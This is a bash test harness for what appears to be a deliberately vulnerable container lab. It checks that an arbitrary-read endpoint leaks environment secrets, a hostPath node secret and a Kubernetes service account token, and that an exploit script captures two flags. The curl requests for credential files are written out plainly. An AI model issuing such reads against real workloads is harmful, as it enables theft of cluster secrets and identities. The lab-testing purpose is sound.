#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 4

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8099 2>/dev/null; do sleep 1; done

BASE="http://127.0.0.1:8099"

# Test 1: /api/info returns pod metadata
OUT=$(curl -s "${BASE}/api/info" 2>/dev/null)
check "api/info returns pod info" "$( echo "$OUT" | grep -q '"node-01"' && echo 1 || echo 0 )"

# Test 2: /proc/self/environ contains POD_SECRET with flag1
OUT=$(curl -s "${BASE}/api/read?path=/proc/self/environ" 2>/dev/null)
check "environ contains POD_SECRET flag1" "$( echo "$OUT" | grep -q 'POD_SECRET' && echo 1 || echo 0 )"

# Test 3: /proc/self/mounts returns mount list
OUT=$(curl -s "${BASE}/api/mounts" 2>/dev/null)
check "mounts endpoint returns mount list" "$( echo "$OUT" | grep -q '"mounts"' && echo 1 || echo 0 )"

# Test 4: /mnt/hostpath/node-secret.txt contains flag2
OUT=$(curl -s "${BASE}/api/read?path=/mnt/hostpath/node-secret.txt" 2>/dev/null)
check "hostpath volume exposes node-secret.txt with flag2" "$( echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}' && echo 1 || echo 0 )"

# Test 5: service account token is readable (k8s identity theft)
OUT=$(curl -s "${BASE}/api/read?path=/var/run/secrets/kubernetes.io/serviceaccount/token" 2>/dev/null)
check "service account token is readable" "$( echo "$OUT" | grep -q 'content' && echo 1 || echo 0 )"

# Test 6: path outside allowed set is rejected
OUT=$(curl -s "${BASE}/api/read?path=/etc/shadow" 2>/dev/null)
check "arbitrary paths outside allowlist are rejected" "$( echo "$OUT" | grep -q '"error"' && echo 1 || echo 0 )"

# Test 7: full exploit
EXPLOIT_OUT=$(python3 exploit/exploit.py 127.0.0.1 8099 2>&1)
FLAG1=$(echo "$EXPLOIT_OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
FLAG2=$(echo "$EXPLOIT_OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | tail -1)
check "exploit gets flag1 from pod environ" "$( [ -n "$FLAG1" ] && echo 1 || echo 0 )"
check "exploit gets flag2 from hostpath volume" "$( [ -n "$FLAG2" ] && echo 1 || echo 0 )"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
